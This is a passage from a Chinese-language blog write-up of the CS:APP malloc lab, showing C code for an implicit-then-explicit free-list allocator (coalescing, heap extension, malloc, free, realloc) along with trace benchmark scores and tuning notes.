comment">/* Case 1 */</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 2 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 3 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment">/* Case 4 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $immediate$ $coalesce$ 策略.</li><li>使用 $header$, $footer$ 作为 $boundary$ $tag$ 进行标记, 根据前后块的 $alloc$ $bit$ 位进行 $free$ $block$ 的合并.</li></ul><h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>size_t words<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>  size_t size<span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block header */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block footer */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* New epilogue header */</span>  <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>用大小为 $size$ 的双字对齐的 $free$ $block$ 扩展堆.</li><li>$epilogue$ $block$ 的 $size$ 为 $0$, $alloc$ $bit$ 位置为 $1$.</li><li>使用 $mem_sbrk$ 分配一个双字对齐块后, $epilogue$ $block$ 变成了 $new$ $free$ $block$ $header$, 下一 $block$ $header$ 特殊化为 $new$ $epilogue$ $block$.</li></ul><h3 id="Malloc-Functions-1"><a href="#Malloc-Functions-1" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_lo <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heap_lo <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>设置  $prologue$ $block$, $epilogue$ $block$.</li><li>用 $CHUNKSIZE$ 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t asize<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment">/* Adjust block size to include overhead and alignment reqs. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> DSIZE<span class="token punctuation">)</span> asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>  <span class="token keyword">else</span> asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Search the free list for a fit */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">first_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">/* No fit found. Get more memory and place the block */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span> <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $size$ 对齐至 $16$ 字节, 并扩展加上 $header$, $footer$.</li><li>首先使用 $first$ $fit$ 策略查询 $free$ $list$, 返回一个指向连续内存块的指针.</li><li>若返回为 $NULL$, 则在该处进行 $extend_heap$.</li></ul><h4 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $alloc$ $bit$ 位置 $0$, 并进行 $free$ $block$ 的合并.</li></ul><h4 id="mm-realloc-1"><a href="#mm-realloc-1" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>如果 $ptr$ 为 $NULL$, 直接调用 $mm_malloc$. </li><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>否则, 直接调用 $mm_malloc$ 分配 $newptr$, 以下同 $Version$ $0$. </li></ul><h3 id="Performance-1"><a href="#Performance-1" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">5694</span>  <span class="token number">0.001877</span>   <span class="token number">3033</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">92</span>%    <span class="token number">5848</span>  <span class="token number">0.001071</span>   <span class="token number">5459</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.004788</span>   <span class="token number">1389</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.005364</span>   <span class="token number">1003</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">50</span>%   <span class="token number">14400</span>  <span class="token number">0.000173</span>  <span class="token number">83189</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">4800</span>  <span class="token number">0.006984</span>    <span class="token number">687</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">87</span>%    <span class="token number">4800</span>  <span class="token number">0.006384</span>    <span class="token number">752</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.015309</span>    <span class="token number">784</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.007432</span>   <span class="token number">3229</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">32</span>%   <span class="token number">14401</span>  <span class="token number">0.141429</span>    <span class="token number">102</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">34</span>%   <span class="token number">14401</span>  <span class="token number">0.003931</span>   <span class="token number">3663</span>Total                             <span class="token number">70</span>%  <span class="token number">112372</span>  <span class="token number">0.194743</span>    <span class="token number">577</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">42</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">2</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">44</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过了所有测试文件.</p><p>几乎所有测试点的 $Kops$ 均需进行优化, 最后两个测试 $mm_realloc$ 功能点的 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-2"><a href="#Version-2" class="headerlink" title="Version 2"></a>Version 2</h2><p>采用 $Explicit$ $Free$ $List$ 组织空闲块, 使用的数据结构为 $Double$ $Linked$ $List$.</p><h3 id="Block-Structure-2"><a href="#Block-Structure-2" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="/pic/48.png" alt=""></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE\,(32\,Bytes)$.</p><h3 id="Macros-1"><a href="#Macros-1" class="headerlink" title="Macros"></a>Macros</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* 前/后 block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* 前/后 free block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRED_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">SUCC_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">+</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>模拟了 $Double$ $Linked$ $List$ 的实现.</li><li>$PRED_BLK$, $SUCC_BLK$ 区别于先前定义的 $PREV_BLK$, $NEXT_BLK$, 用于在 $Explicit$ $Free$ $List$ 中进行前后 $free$ $block$ 的标记.</li></ul><h3 id="Helper-Functions-2"><a href="#Helper-Functions-2" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="insert-free-block"><a href="#insert-free-block" class="headerlink" title="insert_free_block"></a>insert_free_block</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>sentinel<span class="token punctuation">)</span> <span class="token operator">=</span> bp<span class="token punctuation">;</span>   heap_lo <span class="token operator">=</span> bp<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个 $free$ $block$ ) 插入 $Explicit$ $Free$ $List$ 的尾部作为 $sentinel$.</li></ul><h4 id="remove-free-block"><a href="#remove-free-block" class="headerlink" title="remove_free_block"></a>remove_free_block</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span><span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>    heap_lo <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个被分配的 $block$ ) 从 $Explicit$ $Free$ $List$ 中删除.</li><li>需要检查 $bp$ 是否为 $sentinel$.</li></ul><h4 id="first-fit-1"><a href="#first-fit-1" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>malloced <span class="token operator">!=</span> asize<span class="token punctuation">)</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>counter <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize <span class="token operator">/</span> WSIZE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> counter<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 $binary{-}bal.rep$ 与 $binary2{-}bal.rep$ 测试文件中进行了大量相同 $size$ 的 $malloc$ 操作.</p><p>如果重复使用 $first_fit$ 进行检索, 会使 $Kops$ 显著过低.</p></blockquote><ul><li>定义 $malloced$ 为上一次调用 $mm_malloc$ 分配的 $size$ 大小.</li><li>如果重复分配同样 $size$ 的块超过 $48$ 次 ( $48$ 为反复调节获得的最佳参数 ), 则直接调用 $extend_heap$ 将堆扩展相应大小, 不再通过 $first_fit$ 进行检索.</li></ul><h4 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h4><ul><li>若剩余 $payloader$ 需要进行 $split$ 操作, 则先进行 $remove_free_block$, 最后对剩余 $free$ $block$ 进行 $insert_free_block$.</li><li>否则, 直接进行 $remove_free_block$ 并设置 $alloc$ $bit$.</li></ul><h4 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h4><ul><li>仍采用 $immediate$ $coalesce$ 策略.</li><li>在设置 $alloc$ $bit$ 前进行 $remove_free_block$, 最后对合并的 $free$ $block$ 进行 $insert_free_block$.</li></ul><h4 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h4><ul><li>由于此时 $minimum$ $block$ $size$ 为 $4 <em> WSIZE$, 将 $size$ 双字对齐后, 若其为 $2 </em> WSIZE$, 则置为 $4 * WSIZE$.</li></ul><h3 id="Malloc-Functions-2"><a href="#Malloc-Functions-2" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-2"><a href="#mm-init-2" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>$mm_init$ 会调用 $extend_heap$ 预分配一块 $4096\,Bytes$ 大小的空间做为起始 $free$ $block$, $mm_malloc$ 在 $List$ 中没有合适 $free$ $block$ 的情况下总会调用 $extend_heap$ 扩展空间, 其大小取 $4096\,Bytes$ 与待分配大小中较大者.</p><p>在 $coalescing{-}bal.rep$ 中, 起始分配 $4095\,Bytes$ 大小的空间, 经过 $16$ 字节对齐和 $Tag$ 扩展后大于 $4096\,Bytes$, 初始的 $4096\,Bytes$ 空间永远不会被利用.</p><p>只需修改 $mm_init$ 中 $extend_heap$ 初始扩展大小为 $minimun$ $block$ $size$ 即可.</p></blockquote><ul><li>用 $minimun$ $block$ $size$ ( $4$ ) 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-realloc-2"><a href="#mm-realloc-2" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>   size_t oldsize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t newsize <span class="token operator">=</span> size <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>newsize <span class="token operator">&lt;=</span> oldsize<span class="token punctuation">)</span> <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   size_t asize <span class="token operator">=</span> oldsize <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token 